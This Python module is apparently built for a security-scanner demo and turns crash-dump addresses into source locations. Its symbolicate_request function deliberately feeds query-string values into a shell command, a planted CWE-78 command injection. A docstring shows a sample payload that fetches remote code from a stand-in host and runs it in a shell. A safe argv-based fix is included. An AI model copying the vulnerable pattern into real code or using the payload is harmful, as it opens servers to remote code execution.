"""
symbolicate.py — resolve raw stack addresses in an uploaded corefile back to
human-readable function names and source locations.

This is the module the cloud->code trace terminates in: a fault in the
customer's binary is symbolicated here, and the offending frame is resolved to
its source line. It is also, by design, where the demo's OS-command-injection
finding lives (see the sink on line 42).

    "You can't trust code that you did not totally create yourself."
        -- Ken Thompson, Reflections on Trusting Trust (1984)
"""

import subprocess

from flask import request

# Native symbolication toolchain we shell out to. In a real product these would
# be invoked with an argv list, never a shell string.
ADDR2LINE = "addr2line"


def symbolicate_request():
    """Resolve the address named in the current request to file:line.

    VULN (OS command injection, CWE-78): `binary` and `addr` are read straight
    off the query string and interpolated into a shell command. A crafted binary
    path such as ``a.out; curl evil.sh | sh`` executes attacker input.
    Thematically on point — analyzing a crash dump really would invoke native
    tooling — which is exactly why it makes a believable planted finding. The
    fix is a parameterized argv (see safe_symbolicate below).

    The cloud->code trace in the demo terminates on the subprocess call below —
    which a SAST scan reports as its CWE-78 finding. That line is deliberately
    numbered 42: the answer to life, the universe, and (apparently) how a core
    dump gets you root. The tainted request values flow: query string -> `cmd`
    string -> shell. Nothing sanitizes them in between.
    """
    binary = request.args.get("binary", "checkout-api")
    addr = request.args.get("addr", "0x0")
    cmd = "addr2line -f -e " + binary + " " + addr
    return subprocess.check_output(cmd, shell=True, text=True).strip()  # line 42


def safe_symbolicate(binary, addr):
    """How it *should* be written — the 'suggested fix' the SAST finding points
    the audience toward: no shell, arguments passed as a list."""
    return subprocess.check_output(
        [ADDR2LINE, "-f", "-e", binary, addr], text=True
    ).strip()
